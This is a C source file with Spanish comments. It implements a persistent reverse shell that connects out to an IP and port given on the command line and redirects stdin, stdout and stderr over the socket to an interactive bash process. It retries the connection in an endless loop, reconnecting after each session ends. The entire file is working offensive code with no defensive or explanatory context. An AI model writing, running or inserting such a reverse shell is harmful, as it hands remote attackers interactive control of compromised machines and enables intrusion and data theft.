#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/wait.h>
#include <stdlib.h>

int main(int argc, char** args) {
    if (argc != 3)
        return 1;
    int port = atoi(args[2]);
    struct sockaddr_in revsockaddr;

    signal(SIGCHLD, SIG_IGN);  // Evitar zombies

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(args[1]);

    while(1){
  	 printf("[*] Intentando conectar a %s:%d...\n", args[1], port);

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) == 0){
            printf("[+] Conexión establecida!\n");

            pid_t pid = fork();
            if (pid == 0) {
                printf("[*] Proceso hijo creado, redirigiendo I/O...\n");
                dup2(sockt, 0);  // stdin
                dup2(sockt, 1);  // stdout
                dup2(sockt, 2);  // stderr
                char * const argv[] = {"bash", NULL};
                execvp("bash", argv);
                close(sockt); // solo si exec falla
                exit(1);
            } else {
                // Padre: esperar a que el hijo termine y cerrar socket
                close(sockt);
                printf("[*] Esperando que termine el hijo (pid %d)...\n", pid);
                waitpid(pid, NULL, 0);
                printf("[*] Hijo terminado, reintentando en 5 segundos...\n");
            	sleep(5);     // Reintentar
            }
        } else {
            perror("[-] Error en connect");
            close(sockt); // No se pudo conectar
            sleep(1);     // Reintentar
        }
    }

    return 0;
}

